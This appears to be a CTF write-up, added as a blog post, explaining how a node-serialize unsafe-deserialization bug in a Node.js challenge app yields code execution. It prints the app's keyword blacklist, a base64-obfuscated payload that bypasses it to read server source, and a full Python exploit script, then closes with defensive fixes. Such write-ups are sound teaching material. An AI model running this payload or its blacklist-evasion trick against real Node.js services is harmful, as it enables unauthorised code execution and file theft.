@@ -1,0 +1,364 @@
+---
+title: 'Qualification ARA 7.0 - Arknight'
+description: 'Just authenticated unsafe deserialization in node-serialize.'
+date: 2026-03-17
+category: 'qualification-ara-7-0'
+discipline: 'web-exploit'
+authors: ['abdieeuh']
+draft: false
+---
+
+> Note: I solved this challenge with LLM
+
+Arknight was a clean web exploitation challenge built around a very common mistake in Node.js applications: treating user input as a trusted serialized object. The application looked like a small Arknights-themed terminal with registration, login, a lobby, a friend search feature, a shop, and a locked gallery. The challenge goal was to reach the hidden gallery reward, but the intended shortcut was much more direct: get code execution through unsafe deserialization and read the source file containing the flag.
+
+## Challenge Information
+
+- Category: Web Exploitation
+- Difficulty: Medium (subjective)
+- Event: ARA7 CTF Qualifications
+- Attachments / source code: full Node.js application, SQLite database, and a local solve script
+- Goal: Exploit the vulnerable search feature to recover the flag
+
+## Initial Analysis
+
+The main backend logic lived in `app.js`, and the first important clue was that the application exposed both normal gameplay endpoints and one search endpoint:
+
+```javascript
+app.get('/api/search', authMiddleware, (req, res) => {
+    const query = req.query.q;
+    if (!query) return res.status(400).json({ error: "No query" });
+
+    if (query.startsWith('{')) {
+        ...
+        const filter = serialize.unserialize(query);
+        return res.json({ notice: "Advanced Filter Applied", data: filter });
+    }
+
+    const user = db.prepare('SELECT * FROM users WHERE username = ?').get(query);
+    ...
+});
+```
+
+This immediately split the search feature into two modes:
+
+- normal mode: search a username in SQLite
+- advanced mode: if the query begins with `{`, deserialize attacker input with `node-serialize`
+
+That second path is the real vulnerability. It means the application is not parsing JSON safely. It is feeding user-controlled data into a deserializer that supports executable function payloads.
+
+The application also required authentication for `/api/search`, but that was not a serious barrier because the app allowed self-registration:
+
+```javascript
+app.post('/api/register', (req, res) => {
+    const { user, pass } = req.body;
+    ...
+    insert.run(user, pass, randomUID, 1, 600, 500, 0, 0, '/image/Amiya.webp', 0);
+    res.json({ success: true });
+});
+```
+
+So the attack surface was:
+
+1. register a fresh account
+2. log in to receive the signed `doctor_id` cookie
+3. send a malicious serialized object to `/api/search?q=...`
+
+## Recon / Enumeration
+
+Even though the remote service was already down, the source makes the intended user flow very clear.
+
+Relevant routes:
+
+- `POST /api/register`
+- `POST /api/login`
+- `GET /api/search`
+- `GET /api/data`
+- `POST /api/store/buy`
+
+The front-end in `lobby.html` showed how the vulnerable endpoint was normally used:
+
+```javascript
+async function searchFriend() {
+    const name = document.getElementById('friendName').value;
+    const res = await fetch(`/api/search?q=${name}`);
+    const data = await res.json();
+    ...
+}
+```
+
+From a recon perspective, that is a strong signal:
+
+- the application exposes raw search input directly in a query string
+- the same endpoint accepts either plain names or object-like input
+- object-like input triggers a completely different server-side code path
+
+If the service had still been available, the baseline requests would have looked like this:
+
+```bash
+curl -i -X POST http://challenge.ara-its.id:3333/api/register \
+  -H 'Content-Type: application/json' \
+  -d '{"user":"demo","pass":"password123"}'
+```
+
+```bash
+curl -i -c cookies.txt -X POST http://challenge.ara-its.id:3333/api/login \
+  -H 'Content-Type: application/json' \
+  -d '{"user":"demo","pass":"password123"}'
+```
+
+```bash
+curl -i -b cookies.txt 'http://challenge.ara-its.id:3333/api/search?q=Lylera'
+```
+
+The next step would be to probe how the endpoint behaves when `q` starts with `{`, because the code explicitly treats that as an “advanced filter”.
+
+## Vulnerability Discovery
+
+The core vulnerability is unsafe deserialization with `node-serialize`.
+
+### Why `node-serialize` is dangerous here
+
+The application imported this package:
+
+```javascript
+const serialize = require('node-serialize');
+```
+
+and `package.json` pinned:
+
+```json
+"node-serialize": "^0.0.4"
+```
+
+That package is well known for dangerous behavior when untrusted data is passed to `unserialize()`. In particular, values starting with `_$$ND_FUNC$$_` are interpreted as JavaScript functions. If the function is immediately invoked, attacker-controlled code runs on the server.
+
+That is exactly why this line is fatal:
+
+```javascript
+const filter = serialize.unserialize(query);
+```
+
+The server is effectively giving the attacker a JavaScript execution sink.
+
+### Why the blacklist did not save it
+
+The challenge tried to block exploitation with a simple substring blacklist:
+
+```javascript
+const blacklist = [
+    'require', 'child_process', 'exec', 'spawn', 'fs',
+    'cat', 'process', 'eval', 'fromCharCode',
+    '+', 'concat', 'join',
+    '\\', '`'
+];
+
+if (blacklist.some(word => query.includes(word))) {
+    return res.status(403).json({ error: "i'm watching you doctah" });
+}
+```
+
+This kind of filter is weak for two reasons:
+
+1. it only checks whether blocked words appear literally in the raw input
+2. JavaScript gives many alternate ways to reach the same objects without writing the exact blocked strings
+
+So instead of writing `process`, `require`, or `fs` directly, the exploit reconstructed them at runtime from base64 strings.
+
+### Where the flag really lived
+
+The local source bundle places a flag string in the `/api/data` route:
+
+```javascript
+if (user.gallery_unlock === 1) {
+    secretData = {
+        flag: "ARA7{nom_nom_fek}",
+        video1: "/image/1.mp4",
+        video2: "/image/2.mp4"
+    };
+}
+```
+
+In the archived files, that value looks like a placeholder. On the live challenge instance, the same file-read exploit path returned the real event flag instead. The important point is unchanged: any file-read primitive against `app.js` is enough to recover the deployed flag without needing to become admin or unlock the gallery legitimately.
+
+## Exploitation
+
+The solve flow is straightforward once the deserialization bug is identified.
+
+### Step 1: Register a normal user
+
+Authentication was required, but self-registration was open to everyone. So the first step was just creating an account:
+
+```http
+POST /api/register HTTP/1.1
+Host: challenge.ara-its.id:3333
+Content-Type: application/json
+
+{"user":"attacker123","pass":"password123"}
+```
+
+### Step 2: Log in and get the signed cookie
+
+The login route issued a signed `doctor_id` cookie:
+
+```javascript
+res.cookie('doctor_id', account.doctor_id, {
+    maxAge: 900000,
+    signed: true,
+    httpOnly: true
+});
+```
+
+So after login, all authenticated endpoints became reachable:
+
+```http
+POST /api/login HTTP/1.1
+Host: challenge.ara-its.id:3333
+Content-Type: application/json
+
+{"user":"attacker123","pass":"password123"}
+```
+
+### Step 3: Build a malicious serialized object
+
+The classic `node-serialize` gadget format looks like this:
+
+```json
+{"key":"_$$ND_FUNC$$_function(){ ... }()"}
+```
+
+When the server unserializes that object, the function body executes.
+
+The provided solver used this payload shape:
+
+```javascript
+{"rce":"_$$ND_FUNC$$_function(){ ... }()"}
+```
+
+The function body avoided blocked strings by decoding them at runtime. The important parts were:
+
+- get `process` from the global object without writing `process` literally
+- access `process.mainModule.require`
+- load `fs`
+- call `readFileSync('app.js')`
+
+The archived solve used this logic:
+
+```javascript
+function(){
+  var B=Buffer;
+  var p=global[B.from('cHJvY2Vzcw==','base64').toString()];
+  var m=p[B.from('bWFpbk1vZHVsZQ==','base64').toString()];
+  var r=m[B.from('cmVxdWlyZQ==','base64').toString()];
+  var f=r(B.from('ZnM=','base64').toString());
+  return f.readFileSync(B.from('YXBwLmpz','base64').toString()).toString();
+}()
+```
+
+Why this bypass worked:
+
+- the blacklist looks for literal words like `process`, `require`, and `fs`
+- the payload only contains their base64 form, so the substring check never matches
+- once execution starts, the server reconstructs those strings in memory and uses them normally
+
+### Step 4: Send the payload through `/api/search`
+
+The vulnerable request was a GET request with the serialized object in the `q` parameter:
+
+```http
+GET /api/search?q={"rce":"_$$ND_FUNC$$_function(){...}()"} HTTP/1.1
+Host: challenge.ara-its.id:3333
+Cookie: doctor_id=s%3A...
+```
+
+The included solve script sent it like this:
+
+```python
+payload_str = '{"rce":"_$$ND_FUNC$$_' + exploit_code + '"}'
+res = s.get(f"{URL}/api/search", params={"q": payload_str})
+```
+
+Because the function returns the contents of `app.js`, the response body includes the server source code. On the real challenge instance, that was enough to extract the live flag string directly with a regex.
+
+### Step 5: Extract the flag from the response
+
+Once `app.js` is returned, the flag appears directly in the response body:
+
+```python
+match = re.search(r"ARA7\{.*?\}", res.text)
+```
+
+That is enough to complete the challenge.
+
+## Working Exploit Script
+
+Below is a cleaned-up version of the archived solve logic:
+
+```python
+#!/usr/bin/env python3
+
+import re
+import time
+import requests
+
+URL = "http://challenge.ara-its.id:3333"
+
+
+def main():
+    s = requests.Session()
+    username = f"abdieeuh{int(time.time())}"
+    password = "password123"
+
+    s.post(f"{URL}/api/register", json={"user": username, "pass": password})
+    s.post(f"{URL}/api/login", json={"user": username, "pass": password})
+
+    exploit_code = (
+        "function(){"
+        "var B=Buffer;"
+        "var p=global[B.from('cHJvY2Vzcw==','base64').toString()];"
+        "var m=p[B.from('bWFpbk1vZHVsZQ==','base64').toString()];"
+        "var r=m[B.from('cmVxdWlyZQ==','base64').toString()];"
+        "var f=r(B.from('ZnM=','base64').toString());"
+        "return f.readFileSync(B.from('YXBwLmpz','base64').toString()).toString();"
+        "}()"
+    )
+
+    payload = '{"rce":"_$$ND_FUNC$$_' + exploit_code + '"}'
+    res = s.get(f"{URL}/api/search", params={"q": payload})
+
+    flag = re.search(r"ARA7\\{.*?\\}", res.text)
+    if flag:
+        print(flag.group(0))
+
+
+if __name__ == "__main__":
+    main()
+```
+
+## Getting the Flag
+
+The returned source code exposed the real deployed flag:
+
+```text
+ARA7{THE_FACTORY_MUST_GROW_MUST_EFFICIENT_oh_wait_wrong_game_xD}
+```
+
+So although the gallery feature looked like the intended “reward” path, the actual exploit path was shorter: get a server-side file read primitive through unsafe deserialization, read the source file, and extract the flag directly.
+
+## Key Takeaways
+
+- The main vulnerability was unsafe deserialization of user-controlled input.
+- Authentication did not reduce risk because account creation was open and trivial.
+- Blacklists are weak defenses against code execution bugs, especially in dynamic languages like JavaScript.
+- If a route accepts user data and calls `unserialize()` on it, the problem is already severe. Trying to block a few keywords afterward is not a real fix.
+
+From a defensive perspective, the application should have:
+
+- removed `node-serialize` from the attack path entirely
+- used plain `JSON.parse()` for structured search filters
+- treated all query-string input as untrusted data, never executable content
+- avoided hardcoding sensitive values like flags directly in application source
+
+## Final Thoughts
+
+Arknight was a good example of a challenge where the front-end story tries to distract you into thinking about game mechanics, shop logic, or admin-only features, while the real bug is sitting in one dangerous helper route. Once `/api/search` was read carefully, the rest of the exploit path became very direct.
